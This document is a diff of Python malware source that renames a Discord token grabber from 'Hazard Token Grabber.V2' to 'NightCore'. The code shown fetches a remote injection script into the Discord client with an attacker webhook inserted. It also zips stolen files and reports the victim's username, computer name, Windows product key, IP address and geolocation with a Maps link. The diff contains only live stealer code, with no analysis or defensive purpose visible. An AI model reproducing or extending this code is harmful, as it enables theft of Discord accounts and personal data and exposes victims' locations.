@@ -85,7 +85,7 @@ class NightCore:
                     except FileNotFoundError:
                         pass
                     try:
-                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\Hazard"))
+                        os.mkdir(os.path.join(root, name+"\\discord_desktop_core\\NightCore"))
                     except FileExistsError:
                         pass
                     f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean").text.replace("%WEBHOOK_LINK%", self.webhook) #By Rdimo
@@ -386,7 +386,7 @@ class NightCore:
             googlemap = "https://www.google.com/maps/search/google+map++" + data['loc']
         except Exception:
             pass
-        _zipfile = os.path.join(self.appdata, f'Hazard.V2-[{os.getlogin()}].zip')
+        _zipfile = os.path.join(self.appdata, f'NightCore-[{os.getlogin()}].zip')
         zipped_file = zipfile.ZipFile(_zipfile, "w", zipfile.ZIP_DEFLATED)
         abs_src = os.path.abspath(self.tempfolder)
         for dirname, _, files in os.walk(self.tempfolder):
@@ -408,7 +408,7 @@ class NightCore:
                         "url": "https://github.com/Maruf132/NightCore-TokenGrabber",
                         "icon_url": "https://c.tenor.com/J-w5FUWA17sAAAAC/hacker.gif"
                     },
-                    "description": f'**{os.getlogin()}** Just ran Hazard Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
+                    "description": f'**{os.getlogin()}** Just ran NightCore Token Grabber.V2\n```fix\nComputerName: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey if wkey else "No Product Key"}\nIP: {ip}\nCity: {city}\nRegion: {region}\nCountry: {country}```[Google Maps Location]({googlemap})\n```fix\n{self.fileCount}{self.files}```',
                     "color": 16119101,
 
                     "thumbnail": {
